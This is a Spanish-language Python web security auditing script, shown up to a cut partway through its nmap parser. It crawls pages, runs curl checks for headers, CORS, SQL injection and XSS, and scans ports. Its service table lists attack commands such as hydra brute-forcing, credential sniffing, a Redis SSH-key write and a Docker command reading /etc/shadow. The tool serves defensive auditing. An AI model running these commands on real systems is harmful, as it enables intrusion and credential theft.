#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║         AUDITOR DE CIBERSEGURIDAD WEB - v6.0                        ║
║  Crawling HTML · Terminal automático · SQLi · Vectores de ataque    ║
╚══════════════════════════════════════════════════════════════════════╝

Instalación:
    pip install requests dnspython colorama
    sudo apt install nmap       # Linux
    brew install nmap           # macOS

Uso:
    python auditoria_seguridad.py
    python auditoria_seguridad.py --url https://ejemplo.com
    python auditoria_seguridad.py --url https://ejemplo.com --output informe.json
    python auditoria_seguridad.py --url https://ejemplo.com --max-pages 50 --no-nmap

⚠️  AVISO LEGAL: Solo para uso en sistemas propios o con autorización
    escrita. Acceso no autorizado → Código Penal art. 197 bis (España).
"""

import sys, socket, ssl, re, time, json, argparse, datetime, urllib.parse
import subprocess, shutil, os, tempfile
from collections import defaultdict
from urllib.parse import urlparse, urljoin, urldefrag

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Falta 'requests'. Ejecuta: pip install requests"); sys.exit(1)

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    class Fore:
        RED=GREEN=YELLOW=CYAN=MAGENTA=WHITE=BLUE=""
    class Style:
        BRIGHT=RESET_ALL=DIM=""

try:
    import dns.resolver, dns.zone, dns.query
    DNS_OK = True
except ImportError:
    DNS_OK = False

VERSION   = "6.0"
TIMEOUT   = 10
MAX_PAGES = 30

SEV = {
    "CRITICA": (Fore.RED+Style.BRIGHT,   "🔴"),
    "ALTA":    (Fore.RED,                "🟠"),
    "MEDIA":   (Fore.YELLOW,             "🟡"),
    "BAJA":    (Fore.CYAN,               "🔵"),
    "INFO":    (Fore.WHITE+Style.DIM,    "⚪"),
    "OK":      (Fore.GREEN,              "✅"),
}
def ico(n): return SEV.get(n,("","•"))[1]
def col(n): return SEV.get(n,(Fore.WHITE,""))[0]
def sep(c="═",w=72): return c*w

def titulo(t):
    print(f"\n{Fore.CYAN+Style.BRIGHT}{sep()}\n  {t}\n{sep()}{Style.RESET_ALL}")

def sub(t):
    print(f"\n{Fore.MAGENTA+Style.BRIGHT}▶ {t}{Style.RESET_ALL}")

def res(nivel, msg, detalle="", ver="", ataque="", defensa="", url_origen=""):
    c_=col(nivel); i_=ico(nivel)
    origen = f" {Fore.WHITE+Style.DIM}[{url_origen}]{Style.RESET_ALL}" if url_origen else ""
    print(f"  {i_} {c_}{msg}{Style.RESET_ALL}{origen}")
    if detalle:
        for ln in detalle.strip().split("\n"):
            print(f"      {Fore.WHITE+Style.DIM}{ln}{Style.RESET_ALL}")
    if ver:
        print(f"      {Fore.BLUE+Style.BRIGHT}🔍 Verificación:{Style.RESET_ALL}")
        for ln in ver.strip().split("\n"):
            print(f"         {Fore.BLUE+Style.DIM}{ln}{Style.RESET_ALL}")
    if ataque:
        print(f"      {Fore.RED+Style.BRIGHT}⚔  Vector de ataque:{Style.RESET_ALL}")
        for ln in ataque.strip().split("\n"):
            print(f"         {Fore.RED+Style.DIM}{ln}{Style.RESET_ALL}")
    if defensa:
        print(f"      {Fore.GREEN+Style.BRIGHT}🛡  Defensa:{Style.RESET_ALL}")
        for ln in defensa.strip().split("\n"):
            print(f"         {Fore.GREEN+Style.DIM}{ln}{Style.RESET_ALL}")


# ════════════════════════════════════════════════════════════════════
# VERIFICADOR DE TERMINAL
# Ejecuta comandos reales y muestra resultado con interpretación
# ════════════════════════════════════════════════════════════════════
class VerificadorTerminal:
    """Abre un subproceso para ejecutar verificaciones reales y
    muestra la salida con interpretación de lo que significa."""

    CURL_OK    = shutil.which("curl")    is not None
    NSLOOKUP   = shutil.which("nslookup") is not None
    OPENSSL    = shutil.which("openssl") is not None

    @staticmethod
    def ejecutar(cmd: list, timeout: int = 15) -> tuple[int, str, str]:
        """Ejecuta un comando y devuelve (returncode, stdout, stderr)."""
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout, errors="replace")
            return r.returncode, r.stdout[:3000], r.stderr[:500]
        except subprocess.TimeoutExpired:
            return -1, "", "TIMEOUT"
        except FileNotFoundError:
            return -2, "", f"Comando no encontrado: {cmd[0]}"
        except Exception as e:
            return -3, "", str(e)

    @classmethod
    def verificar_cabecera(cls, url: str, cabecera: str) -> None:
        """Comprueba con curl si una cabecera existe y muestra el resultado."""
        if not cls.CURL_OK:
            return
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: verificando '{cabecera}' ─────────────{Style.RESET_ALL}")
        cmd = ["curl", "-s", "-I", "--max-time", "8",
               "--insecure", "--location", url]
        rc, out, err = cls.ejecutar(cmd)
        if rc in (-2,-3):
            print(f"      {Fore.YELLOW}  │ curl no disponible{Style.RESET_ALL}")
            return

        lineas = out.lower().split("\n")
        encontrada = [l for l in lineas if l.startswith(cabecera.lower())]

        if encontrada:
            val = encontrada[0].strip()
            print(f"      {Fore.GREEN}  │ ✅ CABECERA PRESENTE:{Style.RESET_ALL}")
            print(f"      {Fore.GREEN}  │    {val}{Style.RESET_ALL}")
            # Interpretación específica
            if cabecera.lower()=="strict-transport-security":
                m=re.search(r"max-age=(\d+)",val)
                if m:
                    age=int(m.group(1))
                    if age>=31536000:
                        print(f"      {Fore.GREEN}  │ ✅ max-age={age} (≥ 1 año) → CORRECTO{Style.RESET_ALL}")
                    elif age>=15768000:
                        print(f"      {Fore.YELLOW}  │ ⚠ max-age={age} (≥ 6 meses pero < 1 año){Style.RESET_ALL}")
                    else:
                        print(f"      {Fore.RED}  │ ❌ max-age={age} DEMASIADO CORTO (< 6 meses){Style.RESET_ALL}")
            if cabecera.lower()=="content-security-policy":
                if "'unsafe-inline'" in val:
                    print(f"      {Fore.YELLOW}  │ ⚠ Contiene 'unsafe-inline' → protección XSS reducida{Style.RESET_ALL}")
                if "'unsafe-eval'" in val:
                    print(f"      {Fore.YELLOW}  │ ⚠ Contiene 'unsafe-eval' → eval() permitido{Style.RESET_ALL}")
        else:
            print(f"      {Fore.RED}  │ ❌ CABECERA AUSENTE → cabecera '{cabecera}' no encontrada{Style.RESET_ALL}")
            print(f"      {Fore.RED}  │    Esto confirma la vulnerabilidad{Style.RESET_ALL}")

        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")

    @classmethod
    def verificar_url_accesible(cls, url: str, descripcion: str) -> tuple[bool, int]:
        """Comprueba con curl si una URL devuelve 200."""
        if not cls.CURL_OK:
            return False, 0
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: probando ruta {descripcion} ─────────{Style.RESET_ALL}")
        cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
               "--max-time", "8", "--insecure", "--max-redirs", "0", url]
        rc, out, _ = cls.ejecutar(cmd)
        code = int(out.strip()) if out.strip().isdigit() else 0
        if code == 200:
            # También mostrar primeras líneas del contenido
            cmd2 = ["curl", "-s", "--max-time", "8", "--insecure",
                    "--max-redirs", "0", url]
            _, content, _ = cls.ejecutar(cmd2)
            preview = content[:200].replace("\n"," ").replace("\r","")
            print(f"      {Fore.RED}  │ ❌ HTTP 200 → RECURSO ACCESIBLE PÚBLICAMENTE{Style.RESET_ALL}")
            print(f"      {Fore.RED}  │    Primeros caracteres: {preview[:120]}{Style.RESET_ALL}")
            print(f"      {Fore.RED}  │    VULNERABLE: este archivo no debería ser público{Style.RESET_ALL}")
        elif code == 403:
            print(f"      {Fore.GREEN}  │ ✅ HTTP 403 → bloqueado correctamente (Forbidden){Style.RESET_ALL}")
        elif code == 404:
            print(f"      {Fore.GREEN}  │ ✅ HTTP 404 → no existe (correcto){Style.RESET_ALL}")
        else:
            print(f"      {Fore.YELLOW}  │ ⚪ HTTP {code} → respuesta no estándar{Style.RESET_ALL}")
        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
        return code == 200, code

    @classmethod
    def verificar_cookie(cls, url: str, nombre_cookie: str) -> None:
        """Comprueba flags de una cookie con curl."""
        if not cls.CURL_OK:
            return
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: analizando cookie '{nombre_cookie}' ──{Style.RESET_ALL}")
        cmd = ["curl", "-s", "-I", "--max-time", "8", "--insecure", url]
        _, out, _ = cls.ejecutar(cmd)
        lineas = [l for l in out.lower().split("\n") if "set-cookie" in l]
        encontrada = [l for l in lineas if nombre_cookie.lower() in l.lower()]
        if encontrada:
            raw = encontrada[0]
            print(f"      {'  │ '}Línea Set-Cookie: {raw[:120]}")
            flags = {"secure": "🔴 FALTA flag Secure → transmisible por HTTP",
                     "httponly": "🔴 FALTA flag HttpOnly → accesible desde JavaScript",
                     "samesite": "🟡 FALTA SameSite → vulnerable a CSRF"}
            for flag, msg in flags.items():
                if flag in raw:
                    print(f"      {Fore.GREEN}  │ ✅ flag '{flag}' presente{Style.RESET_ALL}")
                else:
                    print(f"      {Fore.RED}  │ ❌ {msg}{Style.RESET_ALL}")
        else:
            print(f"      {Fore.YELLOW}  │ Cookie '{nombre_cookie}' no encontrada en esta petición{Style.RESET_ALL}")
        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")

    @classmethod
    def verificar_ssl_terminal(cls, hostname: str, puerto: int = 443) -> None:
        """Comprueba el certificado SSL con openssl."""
        if not cls.OPENSSL:
            return
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: inspeccionando certificado SSL ──────{Style.RESET_ALL}")
        cmd = ["openssl", "s_client", "-connect", f"{hostname}:{puerto}",
               "-servername", hostname]
        rc, out, err = cls.ejecutar(cmd + [], timeout=10)
        combined = out + err

        # Fecha de expiración
        m_date = re.search(r"notAfter=(.*)", combined)
        if m_date:
            date_str = m_date.group(1).strip()
            print(f"      {'  │ '}Expira: {date_str}")
            try:
                exp = datetime.datetime.strptime(date_str, "%b %d %H:%M:%S %Y %Z")
                dias = (exp - datetime.datetime.utcnow()).days
                if dias < 0:
                    print(f"      {Fore.RED}  │ ❌ CERTIFICADO EXPIRADO hace {abs(dias)} días{Style.RESET_ALL}")
                elif dias < 15:
                    print(f"      {Fore.RED}  │ ❌ Expira en {dias} días — MUY PRÓXIMO{Style.RESET_ALL}")
                else:
                    print(f"      {Fore.GREEN}  │ ✅ Válido por {dias} días más{Style.RESET_ALL}")
            except Exception:
                pass

        # Protocolo
        m_proto = re.search(r"Protocol\s*:\s*(\S+)", combined)
        if m_proto:
            proto = m_proto.group(1)
            print(f"      {'  │ '}Protocolo: {proto}")
            if proto in ("TLSv1","TLSv1.1","SSLv3"):
                print(f"      {Fore.RED}  │ ❌ Protocolo OBSOLETO: {proto} → vulnerable{Style.RESET_ALL}")
            else:
                print(f"      {Fore.GREEN}  │ ✅ Protocolo actualizado: {proto}{Style.RESET_ALL}")

        # Verificación
        if "Verify return code: 0 (ok)" in combined:
            print(f"      {Fore.GREEN}  │ ✅ Certificado VÁLIDO y verificado por CA reconocida{Style.RESET_ALL}")
        elif "Verify return code:" in combined:
            m_code = re.search(r"Verify return code: (\d+) \(([^)]+)\)", combined)
            if m_code:
                print(f"      {Fore.RED}  │ ❌ Error SSL: {m_code.group(2)}{Style.RESET_ALL}")

        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")

    @classmethod
    def verificar_sqli_terminal(cls, url_test: str, param: str) -> tuple[bool, str]:
        """Ejecuta prueba SQLi con curl y analiza la respuesta."""
        if not cls.CURL_OK:
            return False, ""
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: probando SQLi en parámetro '{param}' ─{Style.RESET_ALL}")
        cmd = ["curl", "-s", "--max-time", "8", "--insecure", url_test]
        rc, out, _ = cls.ejecutar(cmd)

        errores_sql = {
            "sql syntax":          ("MySQL","error de sintaxis SQL"),
            "you have an error in your sql": ("MySQL","error MySQL clásico"),
            "mysql_fetch":         ("MySQL","función PHP MySQL expuesta"),
            "ora-":                ("Oracle","error Oracle DB"),
            "sqlite_":             ("SQLite","error SQLite"),
            "sqlexception":        ("Java","excepción SQL en Java"),
            "syntax error":        ("Generic","error de sintaxis genérico"),
            "unclosed quotation":  ("MSSQL","comilla sin cerrar en MSSQL"),
            "pg_query":            ("PostgreSQL","error PostgreSQL"),
            "warning: mysql":      ("MySQL","warning de MySQL en PHP"),
            "pdoexception":        ("PHP PDO","excepción PDO expuesta"),
            "sqlstate":            ("Generic","estado SQL expuesto"),
            "microsoft ole db":    ("MSSQL","error OLE DB de Microsoft"),
            "jdbc":                ("Java","error JDBC"),
        }
        out_low = out.lower()
        encontrado = False
        tipo_bd = ""
        for patron, (bd, desc) in errores_sql.items():
            if patron in out_low:
                encontrado = True
                tipo_bd = bd
                # Mostrar línea con el error
                for linea in out.split("\n"):
                    if patron in linea.lower() and len(linea.strip()) > 0:
                        print(f"      {Fore.RED}  │ ❌ ERROR SQL DETECTADO ({bd}): {linea.strip()[:100]}{Style.RESET_ALL}")
                        print(f"      {Fore.RED}  │    Significa: {desc}{Style.RESET_ALL}")
                        print(f"      {Fore.RED}  │    VULNERABLE a SQL Injection{Style.RESET_ALL}")
                        break
                break

        if not encontrado:
            # Comprobar si hay diferencia de longitud/contenido sospechosa
            print(f"      {Fore.GREEN}  │ ✅ Sin errores SQL visibles en la respuesta{Style.RESET_ALL}")
            print(f"      {Fore.WHITE+Style.DIM}  │    (puede haber SQLi ciego — requiere análisis manual){Style.RESET_ALL}")

        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
        return encontrado, tipo_bd

    @classmethod
    def verificar_xss_terminal(cls, url_test: str, param: str, payload_marker: str) -> bool:
        """Ejecuta prueba XSS con curl y busca el payload en la respuesta."""
        if not cls.CURL_OK:
            return False
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: probando XSS en parámetro '{param}' ──{Style.RESET_ALL}")
        cmd = ["curl", "-s", "--max-time", "8", "--insecure", url_test]
        rc, out, _ = cls.ejecutar(cmd)
        out_low = out.lower()
        marker_low = payload_marker.lower()

        if marker_low in out_low and "<script" in out_low:
            # Encontrar la línea que contiene el payload
            for linea in out.split("\n"):
                if payload_marker.lower() in linea.lower() and "<script" in linea.lower():
                    print(f"      {Fore.RED}  │ ❌ PAYLOAD XSS REFLEJADO SIN SANITIZAR:{Style.RESET_ALL}")
                    print(f"      {Fore.RED}  │    {linea.strip()[:120]}{Style.RESET_ALL}")
                    print(f"      {Fore.RED}  │    El script se incluye tal cual en el HTML → XSS CONFIRMADO{Style.RESET_ALL}")
                    break
            print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
            return True
        elif payload_marker.lower() in out_low:
            print(f"      {Fore.YELLOW}  │ ⚠ Marcador reflejado pero puede estar codificado{Style.RESET_ALL}")
            # Mostrar contexto
            idx = out_low.find(payload_marker.lower())
            ctx = out[max(0,idx-30):idx+80]
            print(f"      {Fore.YELLOW}  │    Contexto: ...{ctx}...{Style.RESET_ALL}")
        else:
            print(f"      {Fore.GREEN}  │ ✅ Payload NO reflejado — posiblemente sanitizado{Style.RESET_ALL}")

        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
        return False

    @classmethod
    def verificar_cors_terminal(cls, url: str) -> None:
        """Verifica CORS con curl enviando Origin malicioso."""
        if not cls.CURL_OK:
            return
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: verificando configuración CORS ──────{Style.RESET_ALL}")
        cmd = ["curl", "-s", "-I", "--max-time", "8", "--insecure",
               "-H", "Origin: https://evil.example.com", url]
        _, out, _ = cls.ejecutar(cmd)
        out_low = out.lower()

        acao = ""
        for linea in out.split("\n"):
            if "access-control-allow-origin" in linea.lower():
                acao = linea.strip()
                break
        acac = ""
        for linea in out.split("\n"):
            if "access-control-allow-credentials" in linea.lower():
                acac = linea.strip()
                break

        if acao:
            print(f"      {'  │ '}Respuesta del servidor:")
            print(f"      {'  │    '}{acao}")
            if acac:
                print(f"      {'  │    '}{acac}")
            if "*" in acao:
                print(f"      {Fore.YELLOW}  │ ⚠ CORS permisivo: cualquier origen puede leer respuestas{Style.RESET_ALL}")
            elif "evil.example.com" in acao:
                print(f"      {Fore.RED}  │ ❌ CORS REFLEJA ORIGIN ARBITRARIO → VULNERABLE{Style.RESET_ALL}")
                if "true" in acac.lower():
                    print(f"      {Fore.RED}  │ ❌ + Allow-Credentials: true → CRÍTICO: robo de sesión posible{Style.RESET_ALL}")
        else:
            print(f"      {Fore.GREEN}  │ ✅ Sin cabecera Access-Control-Allow-Origin{Style.RESET_ALL}")
            print(f"      {Fore.GREEN}  │    El servidor rechaza el origen evil.example.com → CORRECTO{Style.RESET_ALL}")

        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")

    @classmethod
    def verificar_metodos_terminal(cls, url: str) -> None:
        """Verifica métodos HTTP con curl OPTIONS."""
        if not cls.CURL_OK:
            return
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: verificando métodos HTTP ────────────{Style.RESET_ALL}")
        cmd = ["curl", "-s", "-I", "-X", "OPTIONS",
               "--max-time", "8", "--insecure", url]
        _, out, _ = cls.ejecutar(cmd)
        allow = ""
        for linea in out.split("\n"):
            if linea.lower().startswith("allow:"):
                allow = linea.strip()
                break
        if allow:
            print(f"      {'  │ '}Métodos permitidos: {allow}")
            peligrosos = [m for m in ["TRACE","TRACK","DELETE","PUT","CONNECT"]
                          if m in allow.upper()]
            if peligrosos:
                print(f"      {Fore.RED}  │ ❌ Métodos peligrosos activos: {', '.join(peligrosos)}{Style.RESET_ALL}")
                if "TRACE" in peligrosos:
                    print(f"      {Fore.RED}  │    TRACE permite XST (robo de cookies HttpOnly){Style.RESET_ALL}")
            else:
                print(f"      {Fore.GREEN}  │ ✅ Solo métodos seguros habilitados{Style.RESET_ALL}")
        else:
            print(f"      {Fore.WHITE+Style.DIM}  │ El servidor no expone la cabecera Allow{Style.RESET_ALL}")
        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")

    @classmethod
    def verificar_dns_terminal(cls, hostname: str, tipo: str) -> None:
        """Verifica registros DNS."""
        if not cls.NSLOOKUP:
            return
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: consultando DNS {tipo} ─────────────{Style.RESET_ALL}")
        cmd = ["nslookup", "-type="+tipo, hostname]
        _, out, _ = cls.ejecutar(cmd)
        # Buscar el registro relevante
        if tipo=="TXT":
            spf_lines=[l for l in out.split("\n") if "v=spf1" in l or "v=dmarc1" in l.lower()]
            if spf_lines:
                print(f"      {Fore.GREEN}  │ ✅ Registro encontrado:{Style.RESET_ALL}")
                for l in spf_lines[:2]:
                    print(f"      {Fore.GREEN}  │    {l.strip()[:100]}{Style.RESET_ALL}")
            else:
                non_auth=[l for l in out.split("\n") if "answer" in l.lower() or "text" in l.lower()]
                if non_auth:
                    print(f"      {Fore.YELLOW}  │ ⚠ Registros TXT presentes pero sin SPF/DMARC{Style.RESET_ALL}")
                else:
                    print(f"      {Fore.RED}  │ ❌ Sin registros TXT relevantes → sin SPF/DMARC{Style.RESET_ALL}")
        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")


# ════════════════════════════════════════════════════════════════════
# CRAWLER — SOLO .html y .php (estricto)
# ════════════════════════════════════════════════════════════════════
class Crawler:
    """Rastrea únicamente páginas .html y .php dentro del mismo dominio.
    Cualquier otra extensión o recurso estático es ignorado."""

    # Las ÚNICAS extensiones de página que aceptamos
    EXT_PERMITIDAS = {".html", ".htm", ".php"}

    def __init__(self, base_url, max_pages=MAX_PAGES, session=None):
        self.base      = base_url
        self.parsed    = urlparse(base_url)
        self.hostname  = self.parsed.netloc
        self.max_pages = max_pages
        self.session   = session or requests.Session()
        self.visited:  set  = set()   # URLs ya procesadas (sin query)
        self.to_visit: list = [self._normalizar(base_url)]
        self.pages:    dict = {}      # url_normalizada → Response

    # ── Normalización ────────────────────────────────────────────
    def _normalizar(self, url: str) -> str:
        """Quita fragment y query string — la misma página con ?id=1 y ?id=2
        es la misma página para nosotros."""
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}{p.path}".rstrip("/") or url

    def _mismo_dominio(self, url: str) -> bool:
        p = urlparse(url)
        return p.netloc == self.hostname

    def _es_pagina_valida(self, url: str) -> bool:
        """Solo acepta .html, .htm, .php — rechaza TODO lo demás."""
        path = urlparse(url).path.lower()
        # Sin extensión → puede ser ruta limpia de PHP (ej: /contacto) → aceptar
        _, ext = os.path.splitext(path)
        if ext == "":
            return True
        return ext in self.EXT_PERMITIDAS

    # ── Extracción de links ──────────────────────────────────────
    def _extraer_links(self, base_url: str, html: str) -> list:
        """Extrae solo href de <a> — nunca src de scripts/estilos/imágenes."""
        links = []
        for href in re.findall(
            r'<a(?:\s[^>]*)?\shref=["\']([^"\'#\s][^"\']*)["\']',
            html, re.I
        ):
            # Descartar esquemas no HTTP
            if href.startswith(("mailto:", "tel:", "javascript:", "ftp:", "#")):
                continue
            # Resolver URL completa
            full = urljoin(base_url, href)
            full, _ = urldefrag(full)          # quitar #fragment
            norm   = self._normalizar(full)    # quitar ?query

            if (self._mismo_dominio(norm)
                    and self._es_pagina_valida(norm)
                    and norm not in self.visited
                    and norm not in self.to_visit):
                links.append(norm)
        return links

    # ── Crawl principal ──────────────────────────────────────────
    def crawl(self) -> dict:
        print(f"\n  {Fore.CYAN+Style.BRIGHT}🕷  Rastreando páginas .html y .php "
              f"(máx. {self.max_pages})...{Style.RESET_ALL}")
        print(f"  {Fore.WHITE+Style.DIM}  CSS, JS, imágenes y otros recursos son ignorados{Style.RESET_ALL}")

        while self.to_visit and len(self.pages) < self.max_pages:
            url = self.to_visit.pop(0)
            if url in self.visited:
                continue
            self.visited.add(url)

            try:
                r = self.session.get(url, timeout=TIMEOUT, verify=False,
                                     allow_redirects=True)

                ct = r.headers.get("Content-Type", "").lower()

                # ── Filtro por Content-Type ───────────────────
                # Aunque la URL parezca .php, si el servidor devuelve
                # image/png u otro binario → descartamos
                if "text/html" not in ct:
                    print(f"    {Fore.WHITE+Style.DIM}  ─ omitido "
                          f"[{r.status_code}] ({ct.split(';')[0].strip()}): {url}{Style.RESET_ALL}")
                    continue

                # ── Guardar la página ─────────────────────────
                self.pages[url] = r
                color = Fore.GREEN if r.status_code == 200 else Fore.YELLOW
                print(f"    {color}✓{Style.RESET_ALL} [{r.status_code}] {url}")

                # ── Extraer links del HTML ─────────────────────
                if r.text:
                    nuevos = self._extraer_links(url, r.text)
                    for lnk in nuevos:
                        if lnk not in self.visited:
                            self.to_visit.append(lnk)

            except requests.exceptions.TooManyRedirects:
                print(f"    {Fore.YELLOW}✗{Style.RESET_ALL} {url}  (demasiadas redirecciones)")
            except requests.exceptions.SSLError:
                print(f"    {Fore.YELLOW}✗{Style.RESET_ALL} {url}  (error SSL — ignorado)")
            except Exception as e:
                print(f"    {Fore.YELLOW}✗{Style.RESET_ALL} {url}  ({type(e).__name__})")

        total = len(self.pages)
        print(f"\n  {Fore.CYAN}Páginas .html/.php rastreadas: {total}{Style.RESET_ALL}")
        if total == 0:
            print(f"  {Fore.YELLOW}  Sin páginas HTML/PHP encontradas. "
                  f"Comprueba que la URL es accesible.{Style.RESET_ALL}")
        return self.pages


# ════════════════════════════════════════════════════════════════════
# NMAP
# ════════════════════════════════════════════════════════════════════
class AnalizadorNmap:

    SERVICIOS = {
        21:   ("FTP",         "ALTA",
               "FTP envía credenciales en texto plano. Captura con:\n"
               "  sudo tcpdump -i eth0 port 21 -A\n"
               "Verás usuario y contraseña sin cifrar.",
               "Usa SFTP o FTPS. Deshabilita FTP si no es necesario."),
        22:   ("SSH",         "BAJA",
               "SSH seguro si está bien configurado. Riesgo con contraseñas débiles.\n"
               "Fuerza bruta: hydra -l root -P rockyou.txt ssh://HOST",
               "Solo autenticación por clave pública. fail2ban. Cambia el puerto."),
        23:   ("Telnet",      "CRITICA",
               "TODO en texto plano incluyendo contraseñas.\n"
               "  nc HOST 23  → conexión directa, todo visible",
               "Deshabilita Telnet completamente. Usa SSH."),
        25:   ("SMTP",        "MEDIA",
               "SMTP sin auth: relay abierto para spam.\n"
               "  swaks --to test@test.com --server HOST",
               "Requiere autenticación SMTP. SPF+DKIM+DMARC."),
        80:   ("HTTP",        "BAJA",
               "Sin cifrado. Credenciales en texto plano si hay login.",
               "Redirige todo a HTTPS + HSTS."),
        443:  ("HTTPS",       "INFO",
               "Verifica configuración TLS y certificado.",
               "TLS 1.2+, certificado válido, sin cifrados débiles."),
        445:  ("SMB",         "CRITICA",
               "EternalBlue (CVE-2017-0144): RCE sin autenticación.\n"
               "WannaCry usó este puerto para propagarse.\n"
               "  nmap --script smb-vuln-ms17-010 HOST",
               "NUNCA expongas SMB a Internet. Firewall inmediato."),
        1433: ("MSSQL",       "CRITICA",
               "BD expuesta. Fuerza bruta de credenciales.\n"
               "  hydra -l sa -P wordlist.txt mssql://HOST",
               "BD solo desde red interna o VPN."),
        3306: ("MySQL",       "CRITICA",
               "BD MySQL expuesta a Internet.\n"
               "  mysql -h HOST -u root → intento de acceso sin contraseña",
               "Escuchar solo en 127.0.0.1. VPN para acceso remoto."),
        3389: ("RDP",         "CRITICA",
               "BlueKeep (CVE-2019-0708): RCE sin autenticación.\n"
               "Bots de credential stuffing atacan RDP 24/7.",
               "No expongas RDP. VPN + NLA + parches al día."),
        5432: ("PostgreSQL",  "CRITICA",
               "BD expuesta. Acceso con credenciales por defecto postgres/postgres.",
               "Solo localhost o VPN."),
        6379: ("Redis",       "CRITICA",
               "Sin autenticación: lectura/escritura de todos los datos.\n"
               "RCE via Redis: escribir clave SSH autorizada:\n"
               "  redis-cli -h HOST SET x '\\nssh-rsa AAAAB...'",
               "127.0.0.1 solo. Contraseña fuerte. Firewall."),
        8080: ("HTTP-Alt",    "MEDIA",
               "Panel admin o API sin TLS en puerto alternativo.",
               "Autenticación + HTTPS. Cierra si no es necesario."),
        8443: ("HTTPS-Alt",   "MEDIA",
               "Servicio HTTPS alternativo. Verifica qué corre aquí.",
               "Asegura TLS y autenticación."),
        9200: ("Elasticsearch","CRITICA",
               "Sin autenticación: acceso a TODOS los índices.\n"
               "  curl http://HOST:9200/_cat/indices\n"
               "  → Lista todas las bases de datos indexadas",
               "X-Pack auth obligatorio. Solo localhost."),
        27017:("MongoDB",     "CRITICA",
               "Sin autenticación: acceso a todas las colecciones.\n"
               "  mongo --host HOST → acceso sin contraseña",
               "Autenticación obligatoria. Solo localhost."),
        2375: ("Docker API",  "CRITICA",
               "Control total de contenedores sin autenticación.\n"
               "  docker -H tcp://HOST:2375 ps\n"
               "  docker -H tcp://HOST:2375 run -v /:/host alpine cat /host/etc/shadow",
               "Nunca expongas Docker API. Usa socket Unix con TLS."),
        8888: ("Jupyter",     "CRITICA",
               "Ejecución de código Python arbitrario en el servidor:\n"
               "  import os; os.system('whoami')",
               "Solo localhost. Contraseña + TLS obligatorio."),
    }

    def __init__(self, hostname, ip):
        self.hostname = hostname
        self.ip       = ip
        self.nmap_ok  = shutil.which("nmap") is not None

    def ejecutar(self):
        hallazgos = []
        if not self.nmap_ok:
            sub("NMAP — Análisis de puertos")
            res("INFO","nmap no instalado",
                ver="Linux:   sudo apt install nmap\n"
                    "macOS:   brew install nmap\n"
                    "Windows: https://nmap.org/download.html")
            return hallazgos

        sub("NMAP — Análisis de puertos y servicios")
        puertos = ",".join(str(p) for p in self.SERVICIOS.keys()) + \
                  ",161,389,110,143,111,135,139,4444,5900"
        print(f"  {Fore.CYAN}Escaneando {self.hostname} ({self.ip})...{Style.RESET_ALL}")
        print(f"  {Fore.WHITE+Style.DIM}Puertos: {puertos[:60]}...{Style.RESET_ALL}")

        cmd = ["nmap","-sV",
               "--script",
               "banner,ssl-cert,ssl-enum-ciphers,http-methods,"
               "ftp-anon,smtp-open-relay,redis-info,"
               "mysql-empty-password,mongodb-info,"
               "http-auth-finder,vnc-info",
               "-p", puertos,
               "--open","-T4",
               "--host-timeout","120s",
               "-oX","-",
               self.ip]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            xml = r.stdout
            hallazgos = self._parsear(xml)
        except subprocess.TimeoutExpired:
            res("MEDIA","Nmap timeout. Prueba manualmente:",
                ver=f"nmap -sV -p- --open {self.hostname}")
        except Exception as e:
            res("MEDIA",f"Error nmap: {e}")
        return hallazgos

    def _parsear(self, xml):
        hallazgos = []
        blocks = re.findall(r'<port protocol="\w+" portid="(\d+)">(.*?)</port>', xml, re.S)
        if not blocks:
            res("OK","Nmap no encontró puertos abiertos en el rango analizado",
                ver=f"nmap -p- --open {self.hostname}  (escaneo completo de todos los puertos)")
            return hallazgos

        res("INFO",f"Puertos abiertos: {len(blocks)}")
        for pnum_str, block in blocks:
            pnum = int(pnum_str)
            state_m = re.search(r'state="(\w+)"', block)
            if not state_m or state_m.group(1) != "open":
                continue

            product_m  = re.search(r'product="([^"]*)"', block)
            version_m  = re.search(r'version="([^"]*)"', block)
            service_m  = re.search(r'<service name="([^"]*)"', block)
            scripts    = {s[0]: s[1] for s in re.findall(
                r'<script id="([^"]+)" output="([^"]+)"', block)}

            svc     = service_m.group(1) if service_m else "desconocido"
            product = product_m.group(1)  if product_m  else ""
            version = version_m.group(1)  if version_m  else ""
            ver_str = f"{product} {version}".strip() or svc

            # Mostrar en terminal
            print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ NMAP: Puerto {pnum}/tcp ─────────────────────────{Style.RESET_ALL}")
            print(f"      {'  │ '}Servicio detectado: {ver_str}")

